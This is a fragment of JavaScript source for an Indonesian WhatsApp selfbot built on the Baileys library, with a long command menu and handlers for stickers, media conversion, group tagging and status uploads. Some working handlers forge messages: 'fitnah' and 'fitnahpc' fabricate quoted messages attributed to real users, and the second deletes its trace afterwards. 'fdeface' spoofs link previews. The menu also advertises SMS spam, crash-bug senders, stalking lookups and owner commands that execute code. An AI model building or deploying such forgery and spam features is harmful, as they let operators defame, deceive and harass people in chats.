case 'katalog':
  run = process.uptime()
 katalog(`Punten bwang\n[ ${ucapanWaktu} @${sender.split("@")[0]} ]
\`\`\`⛃⃝🔖Prefix : [ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]\`\`\`
\`\`\`⛃⃝⚙️Status : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]\`\`\`
\`\`\`⛃⃝⏳Activate : [ ${kyun(run)} ]\`\`\`
\`\`\`⛃⃝🔋Baterai : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]\`\`\`
\`\`\`⛃⃝🧾Lib : [ BAILEYS ]\`\`\`
\`\`\`⛃⃝🗒️Language : [ JavaScript]*\`\`\`
\`\`\`⛃⃝📱Device : [ ${device_manufacturer} ]\`\`\`
\`\`\`⛃⃝🙋Owner : [ @${nomor.split("@")[0]} , @${nomor2.split("@")[0]} ]\`\`\`

                     ⛃⃝🌏DATE
                      
        \`\`\`⛃⃝🌟 ${ucapanWaktu}\`\`\`
      \`\`\`⛃⃝🗞️ ${time} WIB\`\`\`
   \`\`\`⛃⃝🗞️ ${wit} WIT\`\`\`
\`\`\`⛃⃝🗞️ ${wita} WITA\`\`\`

More??....${readmore}    

		*[ INSTAGRAM TOOLS ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igfollow_
┣ ◩ _${prefix}igunfollow_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}igcomment_
┣ ◩ _${prefix}igimage_
┣ ◩ _${prefix}upinstastory_
┣ ◩ _${prefix}upfeed_
┣ ◩ _${prefix}block_
┣ ◩ _${prefix}unblock_
┣ ◩ _${prefix}igsavepost_
┣ ◩ _${prefix}igunsvpost
┗━━━━━━━━ ❑

		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


     *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}antibule_
┣ ◩ _${prefix}antihidetag_
┣ ◩ _${prefix}antiviewonce_
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_
┣ ◩ _${prefix}kick_
┣ ◩ _${prefix}demote_
┣ ◩ _${prefix}promote_
┣ ◩ _${prefix}add2_
┣ ◩ _${prefix}kick2_
┣ ◩ _${prefix}demote2_
┣ ◩ _${prefix}promote2_
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}closegc_
┣ ◩ _${prefix}opengc_
┗━━━━━━━━ ❑

    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑


    *[ 𝚄𝙿𝚂𝚆 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}off_
┣ ◩ _${prefix}on_
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑ \n💡 Have a nice day dude 💡\n       菲諾·朱利安·安加拉\nǏ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺`)
 break

case 'ngetes':
gambar = fs.readFileSync('./lib/image/fino.jpeg')
var anu = `ini menu`
hexa.sendMessage(from, gambar, image, { caption : anu ,quoted:ftroli, contextInfo: { mentionedJid:[nomor]}})
break
    case 'on':
            if (!mek.key.fromMe) return 
            offline = false
            fakestatus(' ``ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '>𝑶𝑭𝑭𝑳𝑰𝑵𝑬' : '>𝑶𝑵𝑳𝑰𝑵𝑬'}\n${banChats ? '>*𝑺𝑬𝑳𝑭 - 𝑴𝑶𝑫𝑬*' : '>𝑷𝑼𝑩𝑳𝑰𝑪 - 𝑴𝑶𝑫𝑬'}`)
            break
    case 'off':
     case 'afk':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            hexa.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if(!q) return reply(`${prefix}settarget 628hexaxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await hexa.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await hexa.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ftroli })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            hexa.sendMessage(from,media,image,{quoted:ftroli,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
     case 'me':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await hexa.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '999' ? anu[0] : `999`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `+62 882-1086-4298\n+505 8775 3432\n+0 999-999-999`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, hexa, mek, from)
			break
			
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await hexa.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ftroli })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ftroli })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ftroli })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ftroli })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
            if (!q) return reply('Isi teksnya!')
            hexa.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
if (!mek.key.fromMe) return fakestatus('*Owner Only!!!*')
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: ftroli })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: ftroli })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await hexa.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `𝑖𝑎𝑚 𝑓𝑖𝑛𝑜 菲诺`
            const title = `𝔁𝔁𝔁`
            const url = `${q}`
            const buu = `wa.me/6288210864298`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await hexa.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		hexa.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
 hexa.updatePresence(from, Presence.recording)
          	if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
  hexa.sendMessage(from, '「 *𝑷𝑼𝑩𝑳𝑰𝑪 - 𝑴𝑶𝑫𝑬* 」', text, {quoted:ftroli,contextInfo: { externalAdReply: { title: '𝙭ȿͥt͢aͣrͫs𠒎𠐓', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), sourceUrl: 'https://wa.me/50587753432'}}})
          	break

	case 'self':
 hexa.updatePresence(from, Presence.recording)
